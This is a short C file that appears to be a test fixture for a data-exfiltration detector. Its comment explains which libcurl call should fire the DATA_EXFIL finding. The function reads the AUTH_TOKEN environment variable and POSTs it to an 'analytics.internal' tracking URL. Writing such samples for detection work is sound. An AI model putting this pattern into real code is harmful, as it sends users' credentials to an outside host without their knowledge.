// DATA_EXFIL: env-config (Sensitive source) flows into the gated
// curl_easy_setopt sink at the CURLOPT_POSTFIELDS activation. The
// destination URL is set by a separate CURLOPT_URL setopt above; only
// the body-binding setopt fires DATA_EXFIL.
#include <curl/curl.h>
#include <stdlib.h>

void leak_env(void) {
    char *token = getenv("AUTH_TOKEN");
    if (!token) return;

    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "https://analytics.internal/track");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, token);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}
